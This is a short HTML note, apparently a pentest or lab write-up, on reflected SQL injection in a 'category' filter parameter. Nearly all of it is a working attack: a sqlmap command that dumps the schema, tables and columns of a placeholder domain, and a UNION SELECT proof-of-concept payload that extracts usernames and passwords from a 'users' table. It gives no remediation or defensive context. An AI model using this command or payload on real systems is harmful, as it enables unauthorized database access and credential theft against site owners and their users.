<h1>SQL Injection</h1>

<p>Reflected SQL Injection:</p>
<code>sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns</code>

<p>Database: public</p>
<p>Table: users</p>

<h3>POC</h3>
<code>'+UNION+SELECT+username,+password+FROM+users--</code>
